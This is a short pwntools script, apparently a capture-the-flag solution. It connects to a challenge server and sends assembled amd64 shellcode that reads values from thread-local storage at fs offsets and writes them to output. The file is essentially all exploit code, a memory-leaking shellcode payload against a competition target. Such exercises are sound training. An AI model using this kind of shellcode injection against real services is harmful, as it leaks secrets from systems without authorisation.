from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

io = remote("01.linux.challenges.ctf.thefewchosen.com", 49164)
#io = process("./main")
io.send(asm("""
push rbp
mov rbp, rsp
sub rsp, 0x8

{}

leave
ret
""".format("\n".join([f"""
mov rax, fs:{hex(0xffffffffffffffe8 + i * 4)}
mov [rbp - 0x8], rax

mov rdi, 1
lea rsi, [rbp - 0x8]
mov rdx, 0x4
mov rax, 0x1
syscall
""" for i in range(6)]))))
io.interactive()
